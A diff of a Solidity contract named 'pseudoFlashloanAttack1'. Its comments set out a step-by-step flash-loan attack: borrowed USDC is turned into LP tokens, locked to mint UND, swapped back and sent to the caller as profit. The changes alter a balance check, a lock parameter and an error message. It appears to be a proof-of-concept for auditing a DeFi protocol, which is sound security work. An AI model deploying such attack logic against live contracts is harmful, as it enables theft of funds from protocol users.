@@ -62,7 +62,7 @@ contract pseudoFlashloanAttack1 {
     }    
 
     function flashLoanAttack(address loanReceiver) public {
-        require(usdc.balanceOf(address(this)) == 2000000 * (10 ** 6), "This Contract must contain 2M USDC");
+        require(usdc.balanceOf(address(this)) >= 2000000 * (10 ** 6), "This Contract must contain 2M USDC");
 
         // Flashloan logic
         
@@ -98,7 +98,7 @@ contract pseudoFlashloanAttack1 {
         // step 3: Attacker locks the LP tokens from step 2 and mints 2.25M UND (minus fee)
         uint LPTokens = USDCDAIPair.balanceOf(address(this));
         USDCDAIPair.approve(LLCAddr, LPTokens);
-        unboundLLC.lockLPT(LPTokens, 1 * (10 ** 18));
+        unboundLLC.lockLPT(LPTokens, 1 * (10 ** 2));
         
         // step 4: Attacker buys 2.25M USDC from UND/USDC pool
         uint UndBalance = und.balanceOf(address(this));
@@ -118,7 +118,7 @@ contract pseudoFlashloanAttack1 {
         
         // step 5: Pay back 2M USDC loan (+ fees)
         // require(usdc.transfer(loanReceiver, 2000000 * (10 ** 6)), "Insufficient USDC? FlashLoan failed");
-        require(usdc.balanceOf(address(this)) >= 2000000 * (10 ** 6), "Not enough USDC. Flash Loan would Fail");
+        require(usdc.balanceOf(address(this)) >= 2000000 * (10 ** 6), "Not enough USDC. Flash Loan failed");
         
         // step 6: Send any profits to msg.sender
         uint USDCbal = usdc.balanceOf(address(this));
